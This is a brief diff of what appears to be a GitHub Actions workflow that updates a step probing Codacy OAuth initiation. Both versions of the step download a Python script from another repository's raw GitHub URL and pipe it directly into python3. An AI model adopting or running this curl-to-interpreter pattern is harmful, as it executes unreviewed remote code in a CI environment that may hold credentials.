@@ -12,5 +12,5 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 2
     steps:
-      - name: Inspect Codacy OAuth initiation without following provider redirect
-        run: curl -fsSL https://raw.githubusercontent.com/Vincx12/Potasse/8ae3599ea33fb512e102ee372f2dda4c9ee4bffa/.github/scripts/codacy_oauth_probe.py | python3
+      - name: Resolve and inspect Codacy OAuth initiation without following provider redirect
+        run: curl -fsSL https://raw.githubusercontent.com/Vincx12/Potasse/3d9dcc87bab01eddccec7b79d2a96de70d3891b8/.github/scripts/codacy_oauth_probe.py | python3
